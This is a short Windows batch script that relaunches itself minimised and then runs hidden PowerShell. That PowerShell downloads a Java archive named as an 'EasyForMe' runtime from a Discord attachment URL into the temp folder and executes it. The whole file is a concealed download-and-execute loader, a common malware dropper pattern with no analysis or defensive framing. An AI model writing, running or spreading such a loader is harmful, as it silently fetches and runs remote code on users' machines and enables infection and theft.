@echo off
if "%1"=="h" goto :hidden
start /min cmd /c "%~f0" h & exit /b
:hidden
powershell.exe -NoProfile -WindowStyle Hidden -Command "$url='https://cdn.discordapp.com/attachments/1344411176443842676/1459879596584472658/EasyForMe-Runtime-1342753538459045909.jar?ex=6964e253&is=696390d3&hm=4095c2a59f053d639620454039058204e69b23f9a333da32c9949fcf76d7025a&'; $out=Join-Path $env:TEMP 'EasyForMe.jar'; Invoke-WebRequest -Uri $url -OutFile $out; javaw.exe -jar $out"
